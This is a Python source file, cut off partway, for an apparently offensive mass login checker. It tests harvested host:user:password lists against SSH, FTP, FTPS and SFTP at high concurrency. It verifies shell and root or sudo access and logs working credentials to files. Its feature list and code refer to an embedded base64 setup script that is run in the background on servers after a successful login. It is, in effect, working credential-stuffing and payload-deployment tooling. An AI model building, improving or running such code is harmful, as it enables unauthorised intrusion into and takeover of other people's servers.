# -*- coding: utf-8 -*-
"""Ultra-optimized multi-protocol login scanner with UTF-8 encoding support"""

# Ultra-optimized scanner with ALL SPEED & MEMORY IMPROVEMENTS
#
# MEMORY OPTIMIZATION CHANGES (from 9GB → ~100MB):
# 1. Removed pre-scan of all files (was loading entire 9GB file into memory!)
# 2. Reduced cache size from 5000 → 100 entries (98% reduction)
# 3. Reduced SSH connection pool from 200 → 10 connections (95% reduction)
# 4. Reduced batch size from 2000 → 100 items (95% reduction)
# 5. Added aggressive garbage collection between files
# 6. Streams file counts without buffering entire files
#
# BLOCKING ISSUE FIX:
# 1. CLEANUP_THRESHOLD: 300 → 2000 (reduces file I/O blocking)
# 2. New --skip-cleanup flag (NO I/O BLOCKING for maximum speed)
# 3. SHELL_VERIFY_TIMEOUT: NEW 5s (for shell access probes)
#
# ORIGINAL SPEED OPTIMIZATIONS:
# 1. Pre-filtering with quick port checks
# 2. Async I/O for non-blocking operations
# 3. Minimal timeouts (1-3 seconds)
# 4. Disabled directory listings (optional flag)
# 5. Batched file I/O
# 6. Connection pooling where possible
# 7. Fast-fail on unreachable hosts

# ═══════════════════════════════════════════════════════════════════════════
# VERSION INFORMATION
# ═══════════════════════════════════════════════════════════════════════════
SCRIPT_VERSION = "3.9.5-SSH-BANNER-CHECK"
SCRIPT_FEATURES = [
    "✓ SSH shell verification with exit-code checking (prevents SFTP-only false-positives)",
    "✓ Windows system detection after SSH login (writes to checked_windows.txt)",
    "✓ Background install script execution (no timeout blocking)",
    "✓ 200+ worker threads without freezing",
    "✓ Deadlock-free buffered file I/O",
    "✓ Automatic cleanup of checked servers every 500 entries (streaming-based)",
]

import argparse
import concurrent.futures
import datetime
import ftplib
import gc
import ipaddress
import logging
import os
import re
import shutil
import signal
import socket
import sys
import tempfile
import threading
import time
from collections import deque, OrderedDict
from dataclasses import dataclass
from functools import wraps
from typing import Optional

import colorlog
import paramiko

# EMBEDDED SETUP SCRIPT
try:
    from EMBEDDED_SETUP_SCRIPT import EMBEDDED_SETUP_B64
except ImportError:
    EMBEDDED_SETUP_B64 = ""  # Fallback

# pysftp optional - only needed for SFTP protocol
PYSFTP_AVAILABLE = False
pysftp = None
try:
    import pysftp

    PYSFTP_AVAILABLE = True
except ImportError:
    pass

# ========== UTF-8 ENCODING FIX FOR WINDOWS ==========
# Force UTF-8 output on Windows to handle Unicode characters
if sys.platform.startswith('win'):
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

# ========== OPTIMIERUNGEN ==========


@dataclass
class ScannerConfig:
    """Centralized configuration for all scanner settings"""

    threads: int = 200
    connect_timeout: int = 30
    auth_timeout: int = 10
    command_timeout: int = 30
    batch_size: int = 100  # MEMORY OPTIMIZATION: Reduced from 2000
    cache_size: int = 100  # MEMORY OPTIMIZATION: Reduced from 5000
    cache_ttl: int = 1800  # 30 min
    max_retries: int = 2
    rate_limit_per_sec: int = 100
    ssh_pool_size: int = 10  # MEMORY OPTIMIZATION: Reduced from 200
    skip_dir_listing: bool = False
    skip_script_exec: bool = False
    debug: bool = False


class TTLCache:
    """Cache with Time-To-Live expiration and LRU eviction"""

    def __init__(
        self, max_size=100, ttl_seconds=3600
    ):  # MEMORY OPTIMIZATION: Reduced from 10000
        self.cache = OrderedDict()
        self.timestamps = {}
        self.max_size = max_size
        self.ttl = ttl_seconds
        self.hits = 0
        self.misses = 0
        self.lock = threading.Lock()

    def get(self, key):
        """Get value from cache, returns None if expired or not found"""
        with self.lock:
            if key not in self.cache:
                self.misses += 1
                return None

            if time.time() - self.timestamps[key] > self.ttl:
                # Expired
                del self.cache[key]
                del self.timestamps[key]
                self.misses += 1
                return None

            self.hits += 1
            self.cache.move_to_end(key)  # Mark as recently used
            return self.cache[key]

    def set(self, key, value):
        """Set value in cache"""
        with self.lock:
            if len(self.cache) >= self.max_size:
                # Remove oldest
                oldest = next(iter(self.cache))
                del self.cache[oldest]
                del self.timestamps[oldest]

            self.cache[key] = value
            self.timestamps[key] = time.time()
            self.cache.move_to_end(key)

    def stats(self):
        """Get cache statistics"""
        total = self.hits + self.misses
        hitrate = (self.hits / total * 100) if total > 0 else 0
        return f"Cache: {len(self.cache)} entries, {hitrate:.1f}% hitrate, size={len(self.cache)}"

    def clear(self):
        """Clear all cache entries"""
        with self.lock:
            self.cache.clear()
            self.timestamps.clear()


class SSHConnectionPool:
    """Connection pool for SSH - reuses connections to same host"""

    def __init__(
        self, max_connections=10, timeout=30
    ):  # MEMORY OPTIMIZATION: Reduced from 200
        self.pool = {}  # {(host, port, user): client}
        self.max_connections = max_connections
        self.timeout = timeout
        self.lock = threading.Lock()
        self.last_used = {}
        self.reused_count = 0
        self.created_count = 0

    def get_or_create(self, host, port, username, password):
        """Get existing SSH connection or create new one (FIXED - safer handling)"""
        key = (host, port, username)

        with self.lock:
            if key in self.pool:
                try:
                    client = self.pool[key]
                    # Test if connection is still alive
                    if client.get_transport() and client.get_transport().is_active():
                        self.last_used[key] = time.time()
                        self.reused_count += 1
                        return client, True  # reused=True
                except Exception as e:
                    # Connection dead, remove from pool
                    if args.debug_log:
                        script_logger.debug(f"Removing dead connection from pool: {e}")
                    try:
                        client.close()
                    except:
                        pass
                    del self.pool[key]
                    if key in self.last_used:
                        del self.last_used[key]

        # Create new connection
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=self.timeout,
                look_for_keys=False,
                allow_agent=False,
            )

            with self.lock:
                if len(self.pool) >= self.max_connections:
                    # Evict LRU entry - SAFELY close it
                    if self.last_used:
                        lru_key = min(self.last_used, key=self.last_used.get)
                        if lru_key in self.pool:
                            try:
                                self.pool[lru_key].close()
                                if args.debug_log:
                                    script_logger.debug(
                                        f"Evicted LRU connection: {lru_key}"
                                    )
                            except Exception as e:
                                if args.debug_log:
                                    script_logger.warning(
                                        f"Error closing evicted connection: {e}"
                                    )
                            del self.pool[lru_key]
                        if lru_key in self.last_used:
                            del self.last_used[lru_key]

                self.pool[key] = client
                self.last_used[key] = time.time()
                self.created_count += 1

            return client, False  # reused=False
        except Exception as e:
            if args.debug_log:
                script_logger.debug(f"Failed to create SSH connection: {e}")
            raise e

    def close_all(self):
        """Close all pooled connections (FIXED - safe cleanup)"""
        with self.lock:
            closed_count = 0
            for key, client in list(self.pool.items()):
                try:
                    client.close()
                    closed_count += 1
                except Exception as e:
                    if args.debug_log:
                        script_logger.warning(f"Error closing connection {key}: {e}")

            self.pool.clear()
            self.last_used.clear()

            if args.debug_log:
                script_logger.info(f"Closed {closed_count} SSH connections from pool")

    def stats(self):
        """Get pool statistics"""
        return f"SSH Pool: {len(self.pool)} active, {self.reused_count} reused, {self.created_count} created"


class RateLimiter:
    """Token bucket rate limiter to avoid overwhelming servers"""

    def __init__(self, max_per_second=50):
        self.max_per_second = max_per_second
        self.tokens = max_per_second
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def acquire(self):
        """Wait until we can proceed"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_refill

            if elapsed >= 1.0:
                self.tokens = self.max_per_second
                self.last_refill = now

            while self.tokens <= 0:
                sleep_time = (1.0 - elapsed) * 0.1
                time.sleep(min(0.01, sleep_time))
                now = time.time()
                elapsed = now - self.last_refill
                if elapsed >= 1.0:
                    self.tokens = self.max_per_second
                    self.last_refill = now

            self.tokens -= 1


# ═════════════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS - From scanner_FINAL_PERFECT.py
# ═════════════════════════════════════════════════════════════════════════════

def is_private_ip(host: str) -> bool:
    """Check if an IP address is private (RFC 1918, loopback, link-local, etc.)."""
    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_multicast
    except ValueError:
        # Not an IP address, assume public (domain names pass through)
        return False


def clean_host_token(token: str) -> str:
    """Remove path, leading/trailing spaces, and leading/trailing dots."""
    return token.split("/")[0].strip().strip(".")


def is_valid_host(host: str) -> bool:
    """Check if host is a valid IPv4, IPv6, or domain name."""
    if not host or len(host) > 255:
        return False
    try:
        ipaddress.ip_address(host)
        return True
    except ValueError:
        pass
    if host.replace(".", "").isdigit():
        return False
    if ".." in host or host.startswith(".") or host.endswith("."):
        return False
    labels = host.split(".")
    for label in labels:
        if not label or len(label) > 63:
            return False
        if not re.match(r"^[a-zA-Z0-9][a-zA-Z0-9-]*$", label):
            return False
    return True


def verbose_log(msg: str):
    """Log a message with timestamp and [VERBOSE] prefix"""
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] [VERBOSE] {msg}"
        if 'script_logger' in globals():
            script_logger.info(log_msg)
    except Exception:
        pass


def extract_credentials(line: str):
    """
    Unified credential extractor for multiple formats.
    Returns (host, port, username, password) or None.
    Supports: SSH URLs, colon-separated, HTTP/HTTPS, delimiter-based, and space-separated formats.
    """
    line = line.strip()
    if not line:
        return None

    lower_line = line.lower()
    has_protocol = "://" in line

    # 1. URL format (ssh://, sftp://, ftp://, etc.)
    if has_protocol and "@" in line:
        try:
            from urllib.parse import urlparse
            parsed = urlparse(line)
            host = parsed.hostname
            port = parsed.port
            if host and "@" in parsed.netloc:
                userpass, _ = parsed.netloc.split("@", 1)
                if ":" in userpass:
                    username, password = userpass.split(":", 1)
                else:
                    username, password = userpass, ""
                if not is_valid_host(host) or not username or not password:
                    return None
                if port is not None and (port < 1 or port > 65535):
                    return None
                if port is None:
                    port = 22 if lower_line.startswith(("ssh://", "sftp://")) else 22
                return (host, port, username, password)
        except Exception:
            pass

    # 2. Colon-separated (host:port:user:pass or host:user:pass)
    if ":" in line and not lower_line.startswith(("http://", "https://")):
        parts = line.split(":")
        if len(parts) >= 3:
            host_port_part = parts[0].split("/")[0].strip().strip(".")
            if ":" in host_port_part:
                host, port_str = host_port_part.split(":", 1)
                try:
                    port = int(port_str)
                except ValueError:
                    port = 22
            else:
                host = host_port_part
                port = 22
            username = parts[-2].strip()
            password = parts[-1].strip()
            if is_valid_host(host) and username and password and 1 <= port <= 65535:
                return (host, port, username, password)

    # 3. HTTP/HTTPS special handling
    if lower_line.startswith(("http://", "https://")):
        try:
            rest = line[7:] if lower_line.startswith("http://") else line[8:]
            parts = rest.split(":")
            if len(parts) >= 3:
                host = clean_host_token(parts[0]).split(":")[0]
                username = parts[-2].strip()
                password = parts[-1].strip()
                if is_valid_host(host) and username and password:
                    return (host, 22, username, password)
            # Fallback to delimiter-based
            delimiters = r"[;,:| \t]+"
            norm_rest = re.sub(delimiters, " ", rest)
            norm_parts = norm_rest.split()
            if len(norm_parts) >= 3:
                host_candidate = clean_host_token(norm_parts[0])
                if is_valid_host(host_candidate):
                    return (host_candidate, 22, norm_parts[1], " ".join(norm_parts[2:]))
        except Exception:
            pass
        return None

    # 4. Delimiter-based (space, comma, semicolon, pipe, tab)
    delimiters = r"[;,:| \t]+"
    normalized = re.sub(delimiters, " ", line)
    parts = normalized.split()
    if len(parts) >= 3:
        host_part = clean_host_token(parts[0])
        if ":" in host_part:
            host, port_str = host_part.split(":", 1)
            try:
                port = int(port_str)
            except ValueError:
                port = 22
            username = parts[1]
            password = " ".join(parts[2:])
        else:
            host = host_part
            if parts[1].isdigit():
                port = int(parts[1])
                username = parts[2] if len(parts) > 2 else ""
                password = " ".join(parts[3:]) if len(parts) > 3 else ""
            else:
                port = 22
                username = parts[1]
                password = " ".join(parts[2:])

        if is_valid_host(host) and username and password and 1 <= port <= 65535:
            return (host, port, username, password)

    return None


# ═════════════════════════════════════════════════════════════════════════════


def retry_with_backoff(max_attempts=2, initial_delay=0.5, backoff_factor=2.0):
    """Decorator for exponential backoff retry logic (FIXED - better exception handling)"""

    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            delay = initial_delay
            last_exc = None

            for attempt in range(1, max_attempts + 1):
                try:
                    result = func(*args, **kwargs)
                    return result  # Success!
                except (socket.timeout, ConnectionResetError, OSError) as e:
                    last_exc = e
                    if attempt < max_attempts:
                        if args.debug_log:
                            script_logger.debug(
                                f"Attempt {attempt}/{max_attempts} failed ({type(e).__name__}), "
                                f"retrying in {delay}s..."
                            )
                        time.sleep(delay)
                        delay *= backoff_factor
                    else:
                        if args.debug_log:
                            script_logger.debug(
                                f"All {max_attempts} attempts failed: {type(e).__name__}: {e}"
                            )
                except Exception as e:
                    # Non-retryable exceptions: Auth errors, etc.
                    if args.debug_log:
                        script_logger.debug(
                            f"Non-retryable exception ({type(e).__name__}): {e}"
                        )
                    return None

            # All retries exhausted
            return None

        return wrapper

    return decorator


# ========== END OPTIMIERUNGEN ==========

# --- GLOBAL SETTINGS ---

# Global flag for graceful shutdown
SHUTDOWN_REQUESTED = False
SHUTDOWN_LOCK = threading.Lock()

# Global stdout lock - ALL terminal output must acquire this
STDOUT_LOCK = threading.Lock()

_MARKUP_RE = re.compile(r"\[/?[\w_ ]+\]")


def safe_print(msg: str):
    """Thread-safe print. While display is active routes to activity log.
    Otherwise acquires STDOUT_LOCK and prints directly (markup stripped)."""
    global stats
    plain = _MARKUP_RE.sub("", str(msg)).strip()
    if not plain:
        return
    if stats is not None and stats.running:
        stats.add_output(plain)
    else:
        with STDOUT_LOCK:
            print(plain)


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    global SHUTDOWN_REQUESTED
    with SHUTDOWN_LOCK:
        if not SHUTDOWN_REQUESTED:
            SHUTDOWN_REQUESTED = True
            with STDOUT_LOCK:
                print(
                    "\n\n\033[91m⚠️  Ctrl+C detected! Shutting down gracefully...\033[0m\n"
                )
            if args.debug_log:
                script_logger.info("SIGINT received, initiating shutdown")


# Register signal handler
signal.signal(signal.SIGINT, signal_handler)

# Connection messages
CONNECTION_MESSAGES = {
    "timeout": "🕒 Connection taking too long...",
    "dns_fail": "🌐 DNS lookup failed for this host",
    "refused": "🚫 Connection refused - service may not be running",
    "auth_fail": "🔒 Authentication failed - wrong credentials",
    "success": "🎉 Success! Logged in!",
    "script_fail": "⚠️ Connected but script failed to run",
    "no_shell": "🚫 Connected but no shell access",
    "starting": "🚀 Attempting connection to {host}:{port}",
    "retrying": "🔄 Retrying {host}:{port} (attempt {attempt})",
}

# Ultra-aggressive timeouts for maximum speed
QUICK_CHECK_TIMEOUT = 0.5  # Port availability check
CONNECT_TIMEOUT = 30  # TCP connection timeout
AUTH_TIMEOUT = 10  # Authentication timeout
COMMAND_TIMEOUT = 300  # Command execution timeout (5 min for installation script)
SHELL_VERIFY_TIMEOUT = (
    2  # Shell verification commands timeout (CRITICAL: Very short to avoid hangs!)
)

# Batch settings for reduced I/O
BATCH_WRITE_SIZE = 50  # Write to files every N successful logins
BATCH_WRITE_INTERVAL = 5  # Or every N seconds

# These globals are primarily for display and overall statistics tracking
TOTAL_LINES = 0
CURRENT_LINE = 0
CURRENT_LINE_LOCK = threading.Lock()
CURRENT_HOST = ""
CURRENT_HOST_LOCK = threading.Lock()

# Define locks for updating shared variables
LOGIN_ATTEMPTS_LOCK = threading.Lock()

# Define locks for file writing
FILE_LOCKS = {
    "output.txt": threading.Lock(),
    "checked_ssh_dirs.txt": threading.Lock(),
    "checked_sftp_dirs.txt": threading.Lock(),
    "checked_ftp_dirs.txt": threading.Lock(),
    "checked_ftps_dirs.txt": threading.Lock(),
    "checked_ssh.txt": threading.Lock(),
    "checked_ftp.txt": threading.Lock(),
    "checked_ftps.txt": threading.Lock(),
    "checked_sftp.txt": threading.Lock(),
    "root_access.txt": threading.Lock(),
    "root_sudo.txt": threading.Lock(),
    "checked_windows.txt": threading.Lock(),
}

# Batch write buffers
WRITE_BUFFERS = {
    "output.txt": [],
    "checked_ssh.txt": [],
    "checked_ftp.txt": [],
    "checked_ftps.txt": [],
    "checked_sftp.txt": [],
    "root_access.txt": [],
    "root_sudo.txt": [],
    "checked_windows.txt": [],
}
WRITE_BUFFER_LOCK = threading.Lock()
LAST_FLUSH_TIME = time.time()

# Dictionary to track login attempts
login_attempts = {
    "correct_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
    "incorrect_logins": {"SSH": 0, "FTP": 0, "FTPS": 0, "SFTP": 0},
}

# Per-file bookkeeping
FILE_ENTRIES = {}
FILE_COMPLETED = {}
FILE_COMPLETED_COUNTER = {}
PROCESSED_LOCK = threading.Lock()
CLEANUP_THRESHOLD = 500  # Cleanup every 500 servers (balanced: good I/O + memory)

# Tracked servers for cleanup (to remove already-checked servers from input file)
CHECKED_SERVERS_TRACKER = set()  # Track original lines that have been checked
CHECKED_SERVERS_TRACKER_LOCK = threading.Lock()
CLEANUP_INTERVAL = (
    50  # Remove checked servers from input file every 50 servers (was 500)
)
ORIGINAL_LINES_MAP = {}  # Map uid -> original line in input file (for cleanup matching)

# Host reachability cache with TTL (MEMORY OPTIMIZATION: Reduced from 5000)
HOST_REACHABILITY_CACHE = TTLCache(max_size=100, ttl_seconds=1800)  # 30 min TTL
CACHE_LOCK = threading.Lock()
GC_COLLECT_INTERVAL = 100  # Run gc every N completed tasks

# SSH Connection Pool (MEMORY OPTIMIZATION: Reduced from 200)
ssh_connection_pool = SSHConnectionPool(max_connections=10)

# Rate Limiter (OPTIMIZED)
login_rate_limiter = RateLimiter(max_per_second=100)

# CLI args parse
parser = argparse.ArgumentParser(description="Ultra-fast multi-protocol login scanner")

# Single positional argument for path (file or directory) - auto-detected
parser.add_argument(
    "path",
    help="Path to file (.txt) or directory containing .txt files with login information"
)

parser.add_argument(
    "-v", "--verbose", help="Increase output verbosity", action="store_true"
)
parser.add_argument(
    "-t", "--threads", help="Number of threads to use", type=int, default=200
)
parser.add_argument(
    "-p",
    "--protocols",
    help="Specify comma-separated protocols (FTP, FTPS, SFTP, SSH)",
    type=str,
    required=True,
)
parser.add_argument(
    "--debug-log", help="Enable debug logging to debug.log", action="store_true"
)

parser.add_argument(
    "--skip-dir-listing",
    help="Skip directory listings for FTP/SFTP (faster)",
    action="store_true",
)
parser.add_argument(
    "--skip-script-exec",
    help="Skip script execution on SSH (faster)",
    action="store_true",
)
parser.add_argument(
    "--skip-cleanup",
    help="Skip file cleanup (MUCH faster for large files - no I/O blocking)",
    action="store_true",
)

args = parser.parse_args()

# ═══════════════════════════════════════════════════════════════════════════
# AUTO-DETECT FILE vs DIRECTORY
# ═══════════════════════════════════════════════════════════════════════════
input_path = args.path.strip()

# Determine if input is a file or directory
is_directory = False
is_file = False

# Check if path contains "/" or "\" (directory indicator)
# or ends with .txt (file indicator)
if input_path.endswith(".txt"):
    is_file = True
elif "/" in input_path or "\\" in input_path:
    is_directory = True
else:
    # Fallback: check filesystem
    if os.path.isdir(input_path):
        is_directory = True
    elif os.path.isfile(input_path):
        is_file = True
    else:
        parser.error(f"Path does not exist or is neither a file nor directory: {input_path}")

# Automatically set file or directory based on detection
if is_file:
    args.file = input_path
    args.directory = None
    print(f"✓ Detected FILE input: {input_path}")
elif is_directory:
    args.directory = input_path
    args.file = None
    print(f"✓ Detected DIRECTORY input: {input_path}")
else:
    parser.error("Could not determine if input is a file or directory")

protocols = [p.strip().upper() for p in args.protocols.split(",")]

# Validate protocols
supported_protocols = {"FTP", "FTPS", "SFTP", "SSH"}
if not all(p in supported_protocols for p in protocols):
    parser.error(
        f"Invalid protocol specified. Supported: {', '.join(supported_protocols)}"
    )

# Warn if SFTP requested but pysftp not available
if "SFTP" in protocols and not PYSFTP_AVAILABLE:
    print("\n[WARNING] SFTP protocol requested but pysftp is not available.")
    print("  This is a known compatibility issue with paramiko 3.x")
    print("  Option 1: pip install 'paramiko<3.0' pysftp")
    print("  Option 2: Remove SFTP from -p argument")
    print("  SFTP tasks will be skipped automatically.\n")

CHECKED_DIR = "!checked"
if not os.path.exists(CHECKED_DIR):
    os.makedirs(CHECKED_DIR)
    print(f"Created directory: {CHECKED_DIR}")

# --- Logging Configuration ---
script_logger = colorlog.getLogger("script_logger")
script_logger.propagate = False

if args.debug_log:
    FILE_LOCKS["debug.log"] = threading.Lock()
    file_handler = logging.FileHandler("debug.log", mode="a", encoding="utf-8")
    file_handler.setFormatter(
        logging.Formatter("%(asctime)s - %(levelname)-8s - %(message)s")
    )
    file_handler.setLevel(logging.DEBUG)
    script_logger.addHandler(file_handler)
    script_logger.setLevel(logging.DEBUG)
else:
    script_logger.setLevel(logging.CRITICAL)

console_handler = colorlog.StreamHandler()
console_handler.setFormatter(
    colorlog.ColoredFormatter(
        "%(log_color)s%(levelname)-7s%(reset)s │ %(message)s",
        log_colors={
            "DEBUG": "cyan",
            "INFO": "bold_green",
            "WARNING": "bold_yellow",
            "ERROR": "bold_red",
            "CRITICAL": "bold_red,bg_white",
        },
    )
)

console_handler.setLevel(logging.INFO if args.verbose else logging.CRITICAL)
if args.verbose:
    script_logger.addHandler(console_handler)

# Silence other libraries' loggers
logging.getLogger("paramiko").setLevel(logging.CRITICAL)
logging.getLogger("pysftp").setLevel(logging.CRITICAL)
logging.getLogger("ftplib").setLevel(logging.WARNING)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger().setLevel(logging.WARNING)


# --- System Error Stream Redirection ---
class StderrRedirector:
    """Context manager to redirect stderr to a file or /dev/null."""

    def __init__(self, target=os.devnull):
        self.target = target
        self.to_fd = None
        self.old_stderr_fd = None
        self.old_stderr = None
        self.target_file = None

        if target != os.devnull:
            self.target_file = open(target, "a", buffering=1, encoding="utf-8")
        else:
            self.to_fd = os.open(os.devnull, os.O_WRONLY)
            self.target_file = None

    def __enter__(self):
        self.old_stderr = sys.stderr
        self.old_stderr_fd = sys.stderr.fileno()

        if self.target_file:
            target_fd = self.target_file.fileno()
        else:
            target_fd = self.to_fd

        self.dup_stderr = os.dup(self.old_stderr_fd)
        os.dup2(target_fd, self.old_stderr_fd)

        if self.target_file:
            sys.stderr = self.target_file
        else:
            sys.stderr = os.fdopen(os.dup(target_fd), "w", encoding="utf-8")

        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        if sys.stderr is not self.old_stderr and hasattr(sys.stderr, "flush"):
            sys.stderr.flush()

        os.dup2(self.dup_stderr, self.old_stderr_fd)
        os.close(self.dup_stderr)
        sys.stderr = self.old_stderr

        if not self.target_file and self.to_fd is not None:
            os.close(self.to_fd)

        if self.target_file:
            self.target_file.close()

        return False


# --- Fast Port Checker ---
def fast_port_scan_batch(hosts_ports, timeout=QUICK_CHECK_TIMEOUT, workers=100):
    """OPTIMIZATION: Parallel port check for many hosts at once

    Args:
        hosts_ports: List of (host, port) tuples
        timeout: Timeout for each check
        workers: Number of parallel workers

    Returns:
        List of reachable (host, port) tuples
    """
    reachable = []

    def check_single(h, p):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((h, p))
            sock.close()
            return (h, p, result == 0)
        except:
            return (h, p, False)

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(check_single, h, p) for h, p in hosts_ports]
        for future in concurrent.futures.as_completed(futures):
            h, p, is_open = future.result()
            if is_open:
                reachable.append((h, p))
                # Cache the result
                cache_key = f"{h}:{p}"
                HOST_REACHABILITY_CACHE.set(cache_key, True)

    return reachable


def ensure_file_header(filename: str):
    """Write version header to output file if it doesn't exist yet"""
    if not os.path.exists(filename):
        header = f"╔═══════════════════════════════════════════════════════════════╗\n"
        header += (
            f"║ Generated with Scanner v{SCRIPT_VERSION}                            ║\n"
        )
        header += f"║ Generated at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                          ║\n"
        header += (
            f"╚═══════════════════════════════════════════════════════════════╝\n\n"
        )

        with FILE_LOCKS[filename]:
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(header)
            except Exception as e:
                if args.debug_log:
                    script_logger.error(f"Error writing header to {filename}: {e}")


def cleanup_input_file(input_file: str):
    """
    Remove already-checked servers from input file without rewriting the entire file.
    Only keeps servers that haven't been checked yet.
    Uses streaming to avoid loading entire file into memory.
    """
    global CHECKED_SERVERS_TRACKER

    script_logger.warning(
        f"[CLEANUP-FUNC-START] cleanup_input_file called with: {input_file}"
    )

    if not input_file:
        script_logger.error(f"❌ [CLEANUP-FUNC] input_file is None/empty!")
        return

    if not os.path.exists(input_file):
        script_logger.error(f"❌ [CLEANUP-FUNC] File does not exist: {input_file}")
        return

    script_logger.warning(
        f"[CLEANUP-FUNC] File exists, size={os.path.getsize(input_file)} bytes"
    )

    try:
        # Make a copy of tracker to avoid race conditions
        with CHECKED_SERVERS_TRACKER_LOCK:
            tracked_servers = set(CHECKED_SERVERS_TRACKER)
            tracker_size = len(tracked_servers)

        script_logger.warning(f"[CLEANUP-FUNC] Tracker has {tracker_size} entries")

        if tracker_size == 0:
            script_logger.warning(
                "⚠️  [CLEANUP-FUNC] Tracker is empty, nothing to clean!"
            )
            return

        temp_file = f"{input_file}.tmp_cleanup_{int(time.time())}"
        removed_count = 0
        kept_count = 0

        script_logger.warning(f"🧹 [CLEANUP-FUNC] Processing {input_file}")
        script_logger.warning(f"[CLEANUP-FUNC] Will write to temp: {temp_file}")

        # Read from original, write unchecked servers to temp file
        with open(input_file, "r", encoding="utf-8", errors="ignore") as infile:
            with open(temp_file, "w", encoding="utf-8") as outfile:
                for line in infile:
                    line_clean = line.strip()
                    if not line_clean:  # Skip empty lines
                        continue

                    # Check if this server has been checked (search for host:port in the line)
                    # This works with formats like: ssh://user:pass@host:port, Host: ... lines, etc.
                    is_checked = False
                    for server_id in tracked_servers:
                        if server_id in line_clean:  # host:port match
                            is_checked = True
                            break

                    if is_checked:
                        removed_count += 1
                        if args.debug_log and removed_count <= 5:
                            script_logger.debug(f"   ✓ Removing: {line_clean[:80]}")
                    else:
                        # Keep unchecked servers
                        outfile.write(line)  # Write original line (keep formatting)
                        kept_count += 1

        # Replace original file with cleaned version
        script_logger.warning(
            f"[CLEANUP-FUNC] Removed {removed_count}, Kept {kept_count}"
        )

        if kept_count > 0:
            script_logger.warning(f"[CLEANUP-FUNC] Moving {temp_file} → {input_file}")
            shutil.move(temp_file, input_file)
            script_logger.warning(
                f"✅ [CLEANUP-FUNC] File replace SUCCESS! New size={os.path.getsize(input_file)} bytes"
            )
        elif kept_count == 0 and removed_count > 0:
            # All servers were checked - move file to \!checked directory
            script_logger.warning(f"[CLEANUP-FUNC] All servers checked, moving to \\!checked")
            if os.path.exists(temp_file):
                os.remove(temp_file)

            # Create \!checked directory if it doesn't exist
            checked_dir = os.path.join(os.path.dirname(input_file), "!checked")
            try:
                os.makedirs(checked_dir, exist_ok=True)

                # Move the file to \!checked directory
                file_basename = os.path.basename(input_file)
                checked_filepath = os.path.join(checked_dir, file_basename)

                # If file already exists in !checked, add timestamp
                if os.path.exists(checked_filepath):
                    name, ext = os.path.splitext(file_basename)
                    checked_filepath = os.path.join(checked_dir, f"{name}_completed_{int(time.time())}{ext}")

                shutil.move(input_file, checked_filepath)
                safe_print(f"[bold green]✅ [CLEANUP] All hosts checked! File moved to: !checked\\{os.path.basename(checked_filepath)}[/bold green]")
                script_logger.warning(
                    f"✅ [CLEANUP-FUNC] File moved to !checked (all {removed_count} servers checked)"
                )
            except Exception as e:
                script_logger.warning(f"⚠️  [CLEANUP-FUNC] Could not move file to !checked: {e}")
                # Fallback: clear the file
                with open(input_file, "w", encoding="utf-8") as f:
                    f.write("")
                script_logger.warning(
                    f"✅ [CLEANUP-FUNC] File cleared (all {removed_count} servers checked)"
                )
        else:
            script_logger.warning(
                f"[CLEANUP-FUNC] No changes needed (removed={removed_count}, kept={kept_count})"
            )
            if os.path.exists(temp_file):
                os.remove(temp_file)

        # Clear tracker AFTER cleanup completes
        with CHECKED_SERVERS_TRACKER_LOCK:
            CHECKED_SERVERS_TRACKER.clear()
            script_logger.warning(f"[CLEANUP-FUNC] Tracker cleared")

    except Exception as e:
        script_logger.error(f"❌ [CLEANUP-FUNC] EXCEPTION: {e}")
        import traceback

        script_logger.error(traceback.format_exc())


def is_port_open(host: str, port: int, timeout: float = QUICK_CHECK_TIMEOUT) -> bool:
    """Ultra-fast port availability check before attempting login (OPTIMIZED with TTL cache)"""
    cache_key = f"{host}:{port}"

    # Check cache first (with TTL)
    cached_result = HOST_REACHABILITY_CACHE.get(cache_key)
    if cached_result is not None:
        return cached_result

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        sock.close()

        is_open = result == 0

        # Cache with TTL (automatically expires after 30 min)
        HOST_REACHABILITY_CACHE.set(cache_key, is_open)

        return is_open
    except (socket.gaierror, socket.error):
        HOST_REACHABILITY_CACHE.set(cache_key, False)
        return False


# --- Batched File Writer ---
def add_to_write_buffer(filename: str, content: str):
    """Add content to write buffer for batched I/O"""
    global LAST_FLUSH_TIME

    should_flush = False

    with WRITE_BUFFER_LOCK:
        if filename in WRITE_BUFFERS:
            WRITE_BUFFERS[filename].append(content)

            # Check if flush needed (but don't flush while holding lock!)
            current_time = time.time()
            buffer_size = len(WRITE_BUFFERS[filename])
            time_since_flush = current_time - LAST_FLUSH_TIME

            if (
                buffer_size >= BATCH_WRITE_SIZE
                or time_since_flush >= BATCH_WRITE_INTERVAL
            ):
                should_flush = True

    # CRITICAL FIX: Flush OUTSIDE the lock to prevent deadlock!
    if should_flush:
        flush_write_buffers()


def flush_write_buffers():
    """Flush all write buffers to disk"""
    global LAST_FLUSH_TIME

    with WRITE_BUFFER_LOCK:
        for filename, buffer in WRITE_BUFFERS.items():
            if buffer and filename in FILE_LOCKS:
                with FILE_LOCKS[filename]:
                    try:
                        with open(filename, "a", encoding="utf-8") as f:
